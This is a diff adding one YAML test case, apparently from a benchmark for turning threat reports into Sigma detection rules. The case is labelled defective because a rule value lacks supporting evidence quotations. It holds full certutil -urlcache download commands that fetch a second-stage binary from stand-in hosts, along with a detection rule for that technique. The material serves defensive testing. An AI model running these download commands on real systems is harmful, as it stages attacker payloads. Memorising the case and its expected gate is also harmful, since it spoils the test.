@@ -1,0 +1,112 @@
+id: D4-02
+role: defective
+defect_class: D4
+evasive: true
+why: The -split switch appears in report_text but inside neither evidence quotation (the quotations are
+  'certutil.exe -urlcache' and the URL, which skip it), and no assumption covers it. The value is therefore
+  not backed by a verified quotation even though a superficial search of the report would find it; the
+  other values are quoted.
+expected_gate: G4
+report_text: Hosts compromised in the Quillfeather campaign showed a consistent staging step. Immediately
+  after initial access, the operator used the built-in certificate utility to retrieve a second-stage
+  binary from infrastructure at stage.cranemail.test. Endpoint telemetry captured the full command line
+  as certutil.exe -urlcache -split -f http://stage.cranemail.test/pack/updsvc.bin C:\Users\Public\updsvc.bin
+  on every affected host. The downloaded file was then renamed with an .exe extension and executed from
+  the Public profile directory. Retrieval took place within minutes of the first interactive logon, and
+  no antivirus alert was raised at the time. The behaviour matches the abuse of a trusted Windows utility
+  as a download proxy, a pattern the team has seen in earlier intrusions against the same sector.
+evidence:
+- certutil.exe -urlcache
+- http://stage.cranemail.test/pack/updsvc.bin
+logsource: windows_process_creation
+techniques:
+- T1105
+sigma_yaml: |
+  title: Certutil Urlcache Download With Split Switch
+  id: a93f0d6e-52c1-4b87-8f3a-1e6d2b49c7a0
+  status: experimental
+  description: Detects certutil.exe used with the urlcache and split switches to download a file over HTTP.
+  references:
+    - urn:atidep:case
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.command_and_control
+    - attack.t1105
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      Image|endswith: '\certutil.exe'
+      CommandLine|contains|all:
+        - '-urlcache'
+        - '-split'
+        - 'http'
+    condition: selection
+  falsepositives:
+    - Administrators retrieving certificate revocation material with certutil
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil.exe -urlcache -split -f http://stage.cranemail.test/pack/updsvc.bin C:\Users\Public\updsvc.bin
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe /c start
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil -urlcache -split -f http://198.51.100.62/pack/cfgd.bin C:\Users\Public\cfgd.bin
+    parent: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    parent_cmd: powershell.exe -NoProfile
+    user: LAB\carol
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\PING.EXE
+    cmd: ping.exe 192.0.2.1
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\whoami.exe
+    cmd: whoami.exe /groups
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil.exe -hashfile C:\Users\alice\Downloads\setup.msi SHA256
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil.exe -urlcache * delete
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\helpdesk
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
